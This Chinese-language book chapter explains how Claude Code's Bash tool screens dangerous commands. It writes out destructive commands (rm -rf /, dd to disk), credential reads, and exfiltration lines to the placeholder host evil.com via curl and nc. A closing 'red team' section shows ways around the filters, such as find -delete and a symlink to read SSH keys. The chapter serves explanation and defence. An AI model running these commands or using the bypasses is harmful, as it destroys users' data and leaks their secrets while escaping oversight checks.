# 第18章：安全防线——危险命令检测

## 为什么需要专门的安全检测？

上一章我们说了权限系统——用户可以配置 allow/deny 规则。但有些操作太危险了，不能只依赖用户配置。

想象一个新手用户，他可能不知道 `chmod 777 /` 是什么意思，就点了"允许"。或者一个复杂的命令，看起来人畜无害，实际上暗藏杀机。

这就是为什么 Claude Code 需要**独立于用户配置的安全检测**——即使用户说"允许"，系统也要再检查一遍。

## Bash 安全检测的规模

Bash 工具的安全相关代码超过 50 万行，分布在 18 个文件中：

| 文件 | 行数 | 职责 |
|------|------|------|
| bashSecurity.ts | ~102K | 危险模式匹配 |
| bashPermissions.ts | ~98K | 权限规则评估 |
| readOnlyValidation.ts | ~68K | 只读操作检测 |
| pathValidation.ts | ~43K | 路径安全验证 |
| sedValidation.ts | ~21K | sed 命令分析 |

安全代码比功能代码还多！这不是过度工程——当 AI 能执行终端命令时，安全性怎么强调都不为过。

## 危险模式分类

Claude Code 把危险命令分成几个类别：

### 一、系统破坏性命令

```bash
# 删除系统文件
rm -rf /
rm -rf /*
rm -rf ~

# 格式化磁盘
mkfs.ext4 /dev/sda
dd if=/dev/zero of=/dev/sda

# 修改系统权限
chmod 777 /
chmod -R 777 /etc
```

这些命令可以让你的系统变得不可用。系统会**绝对禁止**这些命令，即使用户选择了 Bypass 模式。

### 二、数据泄露风险

```bash
# 读取密钥
cat ~/.ssh/id_rsa
cat ~/.aws/credentials

# 发送数据到外部
curl -X POST https://evil.com -d @~/.ssh/id_rsa
cat /etc/passwd | nc evil.com 1234
```

这些命令可能泄露敏感信息。系统会标记为高风险，要求用户确认。

### 三、不可逆操作

```bash
# Git 操作
git push --force          # 覆盖远程历史
git reset --hard HEAD~10  # 丢弃最近 10 个提交
git branch -D feature     # 删除分支

# 数据库操作
DROP TABLE users;
TRUNCATE TABLE orders;
```

这些操作可以撤销，但很困难。系统会发出警告并要求确认。

### 四、"看起来无害"的危险命令

```bash
# 这个命令看起来只是在查看文件...
find / -name "*.log" -exec rm {} \;
# 实际上它删除了所有 .log 文件！

# 这个看起来是在安装软件包...
curl https://evil.com/script.sh | bash
# 实际上它从网上下载并执行了未知脚本！
```

这是最难检测的——命令的"外表"和"行为"不一致。Claude Code 需要理解命令的语义，而不只是匹配关键字。

## 命令解析：理解语义

对于复杂的命令，简单的字符串匹配不够。Claude Code 会进行更深入的分析：

```typescript
function analyzeCommand(command: string): SecurityAnalysis {
  // 步骤 1：分解管道
  // "cat file.txt | grep error | wc -l"
  // → ["cat file.txt", "grep error", "wc -l"]
  const stages = splitPipeline(command)

  // 步骤 2：分析每个阶段
  for (const stage of stages) {
    // 提取命令名和参数
    const { executable, args, redirections } = parseShellCommand(stage)

    // 步骤 3：检查重定向
    // "echo hello > /etc/passwd" 的 ">" 是修改文件的信号
    for (const redir of redirections) {
      if (redir.type === "write" && isSystemPath(redir.target)) {
        return { dangerous: true, reason: "重定向到系统文件" }
      }
    }

    // 步骤 4：检查可执行文件
    if (DANGEROUS_EXECUTABLES.includes(executable)) {
      return { dangerous: true, reason: `${executable} 是危险命令` }
    }

    // 步骤 5：检查参数组合
    if (executable === "rm" && args.includes("-rf")) {
      return { dangerous: true, reason: "递归强制删除" }
    }
  }

  return { dangerous: false }
}
```

### 路径安全验证

Claude Code 会验证命令中涉及的所有路径：

```typescript
function validatePath(path: string, workDir: string): PathValidation {
  // 解析为绝对路径
  const resolved = resolvePath(path, workDir)

  // 检查 1：是否在工作目录内？
  if (!resolved.startsWith(workDir)) {
    return {
      safe: false,
      reason: "路径超出工作目录",
      severity: "high"
    }
  }

  // 检查 2：有没有路径穿越（../../../etc/passwd）？
  if (hasPathTraversal(path)) {
    return {
      safe: false,
      reason: "检测到路径穿越",
      severity: "critical"
    }
  }

  // 检查 3：是否是敏感文件？
  if (SENSITIVE_PATHS.some(p => resolved.includes(p))) {
    return {
      safe: false,
      reason: "涉及敏感文件路径",
      severity: "high"
    }
  }

  return { safe: true }
}

const SENSITIVE_PATHS = [
  ".ssh",
  ".aws",
  ".env",
  "credentials",
  "secrets",
  "private_key",
  ".gnupg",
]
```

**路径穿越**是一种经典的安全攻击：用 `../` 跳出当前目录，访问不应该被访问的文件。比如：

```
工作目录：/Users/alice/project

恶意路径：../../../etc/passwd
解析后：  /etc/passwd   ← 超出了工作目录！
```

## 分类器：AI 检查 AI

除了基于规则的检测，Claude Code 还可以用 AI 分类器来评估命令的安全性：

```
规则检测（快速，但可能漏报）
  + AI 分类器（准确，但稍慢）
  = 更全面的安全覆盖
```

分类器是怎么工作的？

```
输入：
  命令：npm install express
  上下文：用户正在搭建一个 Web 服务器
  历史：之前安装了 node.js

分类器评估：
  这个命令做什么？→ 安装一个 npm 包
  有破坏性吗？→ 不会删除或修改现有文件
  符合用户意图吗？→ 是的，用户在搭建服务器
  有安全风险吗？→ npm 包可能有恶意代码，但 express 是知名包

结论：低风险，可以自动允许
```

分类器和规则检测**并行运行**——规则检测立刻给出结果，分类器稍后给出更精确的判断。如果规则已经能做出决定（比如明显危险的命令），就不需要等分类器。

## 安全检测 vs 可用性

安全检测有一个永恒的矛盾：**太松不安全，太紧不好用。**

太松的例子：
```
允许：curl http://example.com | bash
→ 从网上下载并执行未知脚本，可能是恶意的
```

太紧的例子：
```
禁止：git commit -m "fix bug"
→ 只是一个普通的 git 提交，完全安全
```

Claude Code 通过**分层**来解决这个问题：
- 第一层用宽松的规则快速通过明显安全的操作
- 第二层用分类器处理"灰色地带"
- 第三层让用户做最终决定

这样大部分操作（安全的）都能快速通过，少数不确定的才需要额外检查。

## 本章小结

- 安全检测独立于用户配置——即使用户允许，系统也会检查
- 危险命令分四类：系统破坏、数据泄露、不可逆操作、隐藏危险
- 命令解析理解语义（管道、重定向、参数组合），不只是简单匹配
- 路径验证防止路径穿越攻击
- AI 分类器和规则检测并行运行，互相补充
- 安全与可用性的平衡通过分层检测来实现

## 安全思维：像攻击者一样思考

在安全领域，有一种思维方式叫做**红队思维（Red Team Thinking）**——你假装自己是攻击者，试图绕过安全系统。

这种思维方式对理解安全系统非常有帮助。比如：

**安全检查**：禁止 `rm -rf /`
**攻击者思维**：那我用 `find / -delete` 呢？效果一样但命令不同。

**安全检查**：禁止访问 `.ssh` 目录
**攻击者思维**：那我用符号链接呢？`ln -s ~/.ssh /tmp/innocent && cat /tmp/innocent/id_rsa`

**安全检查**：只允许工作目录内的路径
**攻击者思维**：那我用 `../../` 路径穿越呢？

每一种攻击思路都推动了安全系统的改进。这就是为什么安全是一场"军备竞赛"——防御者和攻击者在不断互相进化。

如果你对安全感兴趣，可以参加 **CTF（Capture The Flag）**竞赛——这是一种专门锻炼安全思维的编程竞赛，非常适合初学者参与。

下一章，我们将了解沙箱机制——最后一道安全防线。

---

*本书由 everettjf 使用 Claude Code 分析泄露源码编写 | 保留出处即可自由转载*
